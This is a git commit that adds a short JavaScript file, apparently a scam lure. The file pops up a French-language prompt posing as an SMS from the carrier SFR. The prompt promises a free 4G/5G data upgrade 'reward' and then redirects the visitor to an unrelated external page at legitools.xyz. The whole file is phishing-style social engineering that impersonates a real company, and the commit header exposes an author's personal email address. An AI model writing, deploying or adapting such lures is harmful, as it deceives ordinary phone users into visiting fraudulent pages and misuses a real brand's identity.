48bf34475f6497b66c3fa1b186e23cfb4d459b43
harryjohnson86 <mfonjohnson86@gmail.com>
2025-04-03 17:51:11 -0700

    Create sfr-freedata.com.js

---
+++ sfr-freedata.com.js
@@ -0,0 +1,5 @@
+var password = 'Données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir une RÉCOMPENSE DE CARTE SIM DE MISE À NIVEAU DE DONNÉES GRATUITES 4G ou 5G, veuillez appuyer sur OK pour ACTIVER. ','Données gratuites');
+if (password != 'Données gratuites') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
